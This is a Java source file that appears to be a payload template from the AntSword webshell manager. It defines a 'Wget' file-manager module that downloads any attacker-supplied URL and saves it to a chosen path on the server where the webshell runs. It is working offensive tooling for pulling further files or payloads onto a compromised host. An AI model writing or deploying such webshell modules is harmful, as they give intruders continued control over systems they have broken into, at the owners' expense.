package filemanager;

import antSword.Template;

import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class Wget extends Template {
    @Override
    public String run() throws Exception {
        String z1 = getParam("antswordargurl");
        String z2 = getParam("antswordargpath");
        return WgetCode(z1, z2);

    }

    String WgetCode(String urlPath, String saveFilePath) throws Exception {
        URL u = new URL(urlPath);
        int n = 0;
        FileOutputStream os = new FileOutputStream(saveFilePath);
        HttpURLConnection h = (HttpURLConnection) u.openConnection();
        InputStream is = h.getInputStream();
        byte[] b = new byte[512];
        while ((n = is.read(b)) != -1) {
            os.write(b, 0, n);
        }
        os.close();
        is.close();
        h.disconnect();
        return "1";
    }
}
